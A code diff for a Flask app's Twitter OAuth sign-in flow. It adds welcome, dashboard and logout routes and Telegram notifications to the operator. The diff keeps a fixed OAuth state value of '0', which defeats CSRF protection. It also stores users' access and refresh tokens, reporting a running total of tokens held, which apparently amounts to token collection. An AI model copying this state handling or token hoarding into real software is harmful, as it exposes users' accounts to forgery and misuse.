@@ -455,10 +455,15 @@ def home():
     state = request.args.get('state')
     error = request.args.get('error')
 
-    if not code:
-        state = "0"  # Use a fixed state value
-        session['oauth_state'] = state
+    # If user is already logged in, send a return notification and redirect to the welcome page
+    if 'username' in session:
+        username = session['username']
+        send_message_via_telegram(f"👋 @{username} just returned to the website.")
+        return redirect(url_for('welcome'))
 
+    # If the user clicks the Sign Up/Login button, initiate OAuth flow
+    if request.args.get('authorize') == 'true':
+        state = "0"  # Fixed state value for initialization
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
         session['code_verifier'] = code_verifier  # Store code_verifier in the session
 
@@ -470,12 +475,12 @@ def home():
         )
         return redirect(authorization_url)
 
-    # Handling authorization response
+    # Handle authorization response if code is present
     if code:
         if error:
             return f"Error during authorization: {error}", 400
 
-        if state != "0":  # Validate the state
+        if state != session.get('oauth_state', '0'):  # Validate the state
             return "Invalid state parameter", 403
 
         code_verifier = session.pop('code_verifier', None)
@@ -496,7 +501,7 @@ def home():
             access_token = token_response.get('access_token')
             refresh_token = token_response.get('refresh_token')
 
-            # Fetch username and profile URL
+            # Fetch username and profile URL from Twitter API
             username, profile_url = get_twitter_username_and_profile(access_token)
 
             if username:
@@ -505,6 +510,8 @@ def home():
 
                 # Store username in the session
                 session['username'] = username
+                session['access_token'] = access_token
+                session['refresh_token'] = refresh_token
 
                 # Retrieve total token count for notification
                 total_tokens = get_total_tokens()
@@ -518,14 +525,52 @@ def home():
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
 
-                # Redirect to active.html after saving and notifying
-                return redirect(url_for('active'))
+                # Redirect to the welcome page after saving and notifying
+                return redirect(url_for('welcome'))
             else:
                 return "Error retrieving user info with access token", 400
         else:
             error_description = token_response.get('error_description', 'Unknown error')
             error_code = token_response.get('error', 'No error code')
             return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
+    # Render home page with Sign Up/Login button if not authorized
+    return render_template('home.html')
+
+@app.route('/welcome')
+def welcome():
+    username = session.get('username', 'User')
+    
+    # If the user is returning, automatically refresh their token
+    if 'refresh_token' in session:
+        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
+        if access_token and refresh_token:
+            session['access_token'] = access_token
+            session['refresh_token'] = refresh_token
+            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")
+
+    # Determine the message based on user status
+    if 'is_new_user' in session:
+        message = f"Congratulations, @{username}! Your sign-up was successful."
+        session.pop('is_new_user')  # Remove the flag after displaying
+    else:
+        message = f"Welcome back, @{username}!"
+
+    # Render the welcome page with the personalized message
+    return render_template('welcome.html', message=message)
+
+@app.route('/dashboard')
+def dashboard():
+    # Retrieve the username from the session for personalization
+    username = session.get('username', 'User')
+    return render_template('dashboard.html', username=username)
+
+@app.route('/logout')
+def logout():
+    # Clear the session data
+    session.clear()
+    return redirect(url_for('home'))
+
 
 # Route to display active.html
 @app.route('/active')
